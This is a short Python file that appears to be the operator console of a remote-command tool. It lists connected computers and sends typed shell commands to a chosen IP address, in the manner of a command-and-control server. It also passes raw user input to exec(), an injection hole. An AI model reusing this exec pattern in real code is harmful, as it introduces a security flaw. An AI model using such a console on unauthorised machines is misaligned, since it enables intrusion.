# (Written Really Quick for Testing & Representation)
import os
from RuntimeDatabase import RuntimeDatabase
import Handler


class InteractiveShell:
    @staticmethod
    def start_shell():
        command = str()
        while command != "99":
            print("""
Enter a Command Number:
    [0] connected computers list
    [1] execute command on computer
    [99] exit
            """)
            command = input()
            try:
                exec("InteractiveShell.command_" + command + "()")
            except Exception:
                pass

    @staticmethod
    def command_0():
        print(str(list(RuntimeDatabase.idle_connections)))

    @staticmethod
    def command_1():
        if len(RuntimeDatabase.idle_connections.keys()) > 0:
            num = input("computer index: ")
            ip_address = list(RuntimeDatabase.idle_connections)[int(num)]
            command = input("Shell:" + ip_address + "> ")
            Handler.Handler.handle_execute_command(ip_address, command)
        else:
            print("No Connected Computers!")

    @staticmethod
    def command_99():
        print("Server Goes Down:/")
        os._exit(1)
